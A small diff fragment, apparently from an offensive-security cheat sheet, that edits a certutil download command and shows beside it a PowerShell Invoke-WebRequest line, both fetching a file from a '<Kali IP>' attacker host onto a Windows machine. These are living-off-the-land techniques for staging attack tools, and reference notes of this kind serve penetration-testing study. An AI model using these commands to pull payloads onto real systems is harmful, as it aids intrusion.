@@ -37,7 +37,7 @@ Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename>
 
 Certutil
 ```
-certutil -urlcache -f 'http://<Kali IP>/<filename>' <filename>
+certutil -urlcache -f 'http://<Kali IP>/<filename>' <path_destiny><filename>
 ```
 
 
